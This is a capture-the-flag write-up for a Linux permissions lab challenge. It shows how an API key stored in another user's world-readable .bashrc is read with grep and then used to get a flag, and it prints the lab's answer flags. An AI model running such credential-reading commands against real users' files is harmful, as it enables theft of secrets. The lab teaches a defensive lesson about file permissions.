# Linux Luminarium
# Module 15: Silly Sehnanigans

## Snooping on Configurations
Even without making mistakes, users might inadvertently leave themselves at risk. For example, many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information. Believe it or not, your .bashrc is world-readable unless you explicitly change it!

```
hacker@dojo:~$ ls -l ~/.bashrc
-rw-r--r-- 1 hacker hacker 148 Jun  7 05:56 /home/hacker/.bashrc
hacker@dojo:~$
```
You might think, "Hey, at least it's not world-writable by default"! But even world-readable, it can do damage. Since .bashrc is processed by the shell at startup, that is where people typically put initializations for any environment variables they want to customize. Most of the time, this is innocuous things like PATH, but sometimes people store API keys there for easy access. For example, in this challenge:

```
zardus@dojo:~$ echo "FLAG_GETTER_API_KEY=sk-XXXYYYZZZ" > ~/.bashrc
```
Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:

```
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?

NOTE: When you get the API key, just execute flag_getter as the hacker user. This challenge's /challenge/victim is just for theming: you don't need to use it.

### Solve
**Flag:** `pwn.college{4b9RuLEgGrF-SPUt7JnnRIu-PZQ.0FOzEzNxwiNyUDN0EzW}`

This challenge focused on information disclosure through configuration files. Although Zardus had secured his account against previous attacks, his .bashrc file remained world-readable. Since it contained an API key used by flag_getter, the key could be extracted simply by reading the file. The stolen key was then supplied to flag_getter, which verified it and revealed the flag.

```bash
hacker@shenanigans~snooping-on-configurations:~$ grep FLAG_GETTER_API_KEY /home/zardus/.bashrc
FLAG_GETTER_API_KEY=sk-865418539
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-865418539
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{YIQc8n3cfU1EYkgeVVo3P7BYXtZ.0lM0EzNxwiNyUDN0EzW}
```

### New Learnings
Learned that read permissions alone can create serious security risks. Configuration files such as .bashrc are often world-readable and may contain environment variables, API keys, tokens, or other secrets. This challenge demonstrated how sensitive credentials stored in readable configuration files can be stolen and abused without modifying any files or gaining additional privileges.